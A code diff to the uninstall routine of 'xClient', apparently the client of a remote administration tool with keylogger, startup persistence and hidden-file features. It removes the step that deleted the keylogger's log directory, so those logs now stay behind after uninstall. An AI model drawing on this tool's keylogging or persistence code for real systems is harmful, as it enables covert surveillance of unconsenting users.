@@ -1,11 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
-using System.IO;
 using xClient.Config;
-using xClient.Core.Data;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
-using xClient.Core.Utilities;
 
 namespace xClient.Core.Installation
 {
@@ -15,13 +12,8 @@ namespace xClient.Core.Installation
         {
             try
             {
-                RemoveExistingLogs();
-
                 if (Settings.STARTUP)
                     Startup.RemoveFromStartup();
-
-                if (!FileHelper.ClearReadOnly(ClientData.CurrentPath))
-                    throw new Exception("Could not clear read-only attribute");
 
                 string batchFile = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);
 
@@ -41,20 +33,6 @@ namespace xClient.Core.Installation
             catch (Exception ex)
             {
                 new Packets.ClientPackets.SetStatus(string.Format("Uninstallation failed: {0}", ex.Message)).Execute(client);
-            }
-        }
-
-        public static void RemoveExistingLogs()
-        {
-            if (Directory.Exists(Keylogger.LogDirectory)) // try to delete Logs from Keylogger
-            {
-                try
-                {
-                    Directory.Delete(Keylogger.LogDirectory, true);
-                }
-                catch
-                {
-                }
             }
         }
     }
